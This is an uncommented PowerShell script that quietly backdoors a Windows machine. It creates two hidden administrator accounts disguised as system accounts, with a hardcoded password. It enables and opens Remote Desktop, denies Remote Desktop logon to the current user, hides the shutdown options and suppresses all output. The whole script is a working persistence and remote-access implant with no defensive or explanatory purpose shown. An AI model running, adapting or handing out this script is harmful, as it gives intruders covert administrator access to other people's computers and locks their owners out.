Clear-Host

$tempDir = "$env:TEMP\pol_temp"
$configFile = "$tempDir\secpol.inf"
$dbFile = "$tempDir\secpol.sdb"

$currentUser = "$env:USERDOMAIN\$env:USERNAME"
$adminSID = "S-1-5-32-544"
$rdpUsersSID = "S-1-5-32-555"

$adminGroupName = (New-Object System.Security.Principal.SecurityIdentifier($adminSID)).Translate([System.Security.Principal.NTAccount]).Value.Split('\')[1]
$rdpGroupName = (New-Object System.Security.Principal.SecurityIdentifier($rdpUsersSID)).Translate([System.Security.Principal.NTAccount]).Value.Split('\')[1]

New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
secedit /export /cfg $configFile > $null 2>&1

$lines = [System.Collections.Generic.List[string]](Get-Content $configFile)
$privRightsIndex = $lines.IndexOf("[Privilege Rights]")

if ($privRightsIndex -eq -1) { exit }

$shutdownIndex = ($lines | Select-String "^SeShutdownPrivilege").LineNumber
if ($shutdownIndex) {
    $lines[$shutdownIndex[0] - 1] = "SeShutdownPrivilege = $adminSID"
} else {
    $lines.Insert($privRightsIndex + 1, "SeShutdownPrivilege = $adminSID")
}

$denyIndex = ($lines | Select-String "^SeDenyRemoteInteractiveLogonRight").LineNumber
if ($denyIndex) {
    $lineNum = $denyIndex[0] - 1
    $existing = $lines[$lineNum].Split("=")[1].Trim() -split ","
    if ($existing -notcontains $currentUser) {
        $existing += $currentUser
    }
    $lines[$lineNum] = "SeDenyRemoteInteractiveLogonRight = " + ($existing -join ",")
} else {
    $lines.Insert($privRightsIndex + 2, "SeDenyRemoteInteractiveLogonRight = $currentUser")
}

$lines | Set-Content $configFile -Encoding Unicode > $null 2>&1
secedit /configure /db $dbFile /cfg $configFile /areas USER_RIGHTS /quiet > $null 2>&1
Remove-Item $tempDir -Recurse -Force > $null 2>&1

Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ShutdownWithoutLogon" -Value 0 -Type DWord > $null 2>&1

$policyBase = "HKLM:\SOFTWARE\Microsoft\PolicyManager\default\Start"
Set-ItemProperty -Path $policyBase -Name "HideSleep" -Value 1 -Type DWord > $null 2>&1
Set-ItemProperty -Path $policyBase -Name "HideHibernate" -Value 1 -Type DWord > $null 2>&1
Set-ItemProperty -Path $policyBase -Name "HideShutDown" -Value 1 -Type DWord > $null 2>&1

Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0 > $null 2>&1
Enable-NetFirewallRule -DisplayGroup "Remote Desktop" > $null 2>&1
Set-Service -Name TermService -StartupType Automatic > $null 2>&1
Start-Service TermService > $null 2>&1

$password = "Adm!n@93f"
$userAccounts = @("HomeGroupUser", "Other user")
$defaultAccount = Get-LocalUser -Name "DefaultAccount"
$defaultAccountDescription = $defaultAccount.Description
foreach ($user in $userAccounts) {
    net user "$user" "$password" /add > $null 2>&1
    net user "$user" /comment:"$defaultAccountDescription" > $null 2>&1
    net user "$user" /expires:never > $null 2>&1
    net user "$user" /active:yes > $null 2>&1
    Set-LocalUser -Name "$user" -PasswordNeverExpires $true > $null 2>&1

    $regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
    if (-not (Test-Path $regPath)) { New-Item -Path $regPath -Force | Out-Null }
    New-ItemProperty -Path $regPath -Name "$user" -PropertyType DWORD -Value 0 -Force | Out-Null
}

$adminGroup = [ADSI]"WinNT://./$adminGroupName,group"
$rdpGroup = [ADSI]"WinNT://./$rdpGroupName,group"
foreach ($user in $userAccounts) {
    try {
        Add-LocalGroupMember -Group $adminGroupName -Member $user -ErrorAction Stop | Out-Null
    } catch {}
    try {
        Add-LocalGroupMember -Group $rdpGroupName -Member $user -ErrorAction Stop | Out-Null
    } catch {}
}

Exit
